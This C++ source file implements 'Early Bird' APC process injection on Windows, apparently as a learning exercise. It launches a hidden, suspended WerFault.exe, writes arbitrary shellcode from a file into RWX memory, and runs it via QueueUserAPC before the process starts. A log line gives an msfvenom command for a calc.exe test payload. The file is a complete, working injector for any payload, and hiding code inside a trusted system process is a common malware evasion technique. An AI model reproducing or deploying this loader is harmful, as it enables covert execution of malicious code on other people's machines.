#include "earlybird.h"

std::vector<BYTE> ReadShellcodeFromFile(const std::string& filepath) {
	std::ifstream file(filepath, std::ios::binary);
	if (!file) {
		LOG_ERROR("Failed to open the shellcode file");
		return {};
	}

	return std::vector<BYTE>(
		std::istreambuf_iterator<char>(file),
		std::istreambuf_iterator<char>()
	);
}

void PrintShellcodeInfo(const std::vector<BYTE>& shellcode) {
	LOG_INFO("Shellcode size: " + std::to_string(shellcode.size()) + " bytes");

	//print first 32 bytes as hex
	std::cout << "[*] bytes: ";
	size_t limit = shellcode.size() < 32 ? shellcode.size() : 32;
	for (size_t i = 0; i < limit; i++) {
		std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)shellcode[i] << " ";
	}
	std::cout << std::dec << std::endl;
}


/*
Early Bird Injection Implementation
1. CreateProcess with CREATE_SUSPENDED - freeze it before initializing
2. VirtualAllocEx - allocated RWX memory in suspended process
3. WriteProcessMemory  - write shellcode to allocated region
4. QueueUserAPC - queue the shellcode as APC to the main threat
5. ResumeThread - triggers the APC execution before main()

*/

static bool EarlyBirdInject(const std::wstring& targetPath, const std::vector<BYTE>& shellcode) {
	LOG_INFO("Starting EarlyBird injection into: " + std::string(targetPath.begin(), targetPath.end()));

	// create suspended process
	STARTUPINFOW si = { sizeof(si) };
	PROCESS_INFORMATION pi = {}; 

	// hide the window
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;

	BOOL success = CreateProcessW(targetPath.c_str(), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

	if (!success) {
		LOG_ERROR("CreateProcessW failed");
		return false;
	}    

	LOG_SUCCESS("Create suspended process (PID: " + std::to_string(pi.dwProcessId) + ")");

	// allocate executable memory in target process
	LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	if (!remoteMem) {
		LOG_ERROR("VirtualAllocEx failed");
		TerminateProcess(pi.hProcess, 1);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		return false;

	}

	LOG_SUCCESS("Allocated RWX memory: " + std::to_string((ULONG_PTR)remoteMem));

	// write shellcode to the remote process
	SIZE_T bytesWritten = 0;
	success = WriteProcessMemory(pi.hProcess, remoteMem, shellcode.data(), shellcode.size(), &bytesWritten);

	if (!success || bytesWritten != shellcode.size()) {
		LOG_ERROR("WritePRocesMemory failed");
		VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
		TerminateProcess(pi.hProcess, 1);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		return false;
	}

	LOG_SUCCESS("Wrote " + std::to_string(bytesWritten) + " bytes to remote process");

	//queue APC to main threat
	DWORD apcResult = QueueUserAPC((PAPCFUNC)remoteMem, pi.hThread, (ULONG_PTR)remoteMem);

	if (apcResult == 0) {
		LOG_ERROR("QueueUserAPC failed");
		VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
		TerminateProcess(pi.hProcess, 1);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		return false; 
	}

	LOG_SUCCESS("Queued APC to main thread");

	// resume the thread - APC will execute before the main thread begins
	DWORD suspendCount = ResumeThread(pi.hThread);
	if (suspendCount == (DWORD)-1) {
		LOG_ERROR("ResumeThread filaed");
		TerminateProcess(pi.hProcess, 1);
		CloseHandle(pi.hThread);
		CloseHandle(pi.hProcess);
		return false;
	}

	LOG_SUCCESS("Resumed threat (previous suspend count: " + std::to_string(suspendCount) + ")");
	LOG_INFO("APC should execute - opening calculator payload.. ");

	//cleanup our handles
	CloseHandle(pi.hThread);
	CloseHandle(pi.hProcess);

	return true;
}

int main(int argc, char* argv[]) {

	std::wstring TargetPath = L"C:\\Windows\\System32\\WerFault.exe";

	//read the shellcode from file

	std::vector<BYTE> shellcode;


	if (argc > 1) {
		// utilize the CLI as the shellcode file
		shellcode = ReadShellcodeFromFile(argv[1]);
	}
	else {
		// try to read the .bin from current directory
		shellcode = ReadShellcodeFromFile("calc_x64.bin");
	}

	if (shellcode.empty()) {
		LOG_ERROR("No shellcode loaded. Usage: EarlyBird Injection.exe <shellcode_file>");
		LOG_INFO("Generate test shellcode: msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc_x64.bin");
		return 1;
	}

	PrintShellcodeInfo(shellcode);

	// perform the earlybird injection
	if (EarlyBirdInject(TargetPath, shellcode)) {
		LOG_SUCCESS("Injection completed successfully");
		LOG_INFO("Check if the calculator was opened");
	}
	else {
		LOG_ERROR("Injection failed");
		return 1;
	}

	return 0;
}

// microsoft docs CreateProcessW: https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags
// VirtualAllocEx: https://arz101.medium.com/process-injection-14fe552c2f1d
// WriteProcessMemory: https://arz101.medium.com/process-injection-14fe552c2f1d
// QueuUserApc: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc2
// ResumeThread: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/
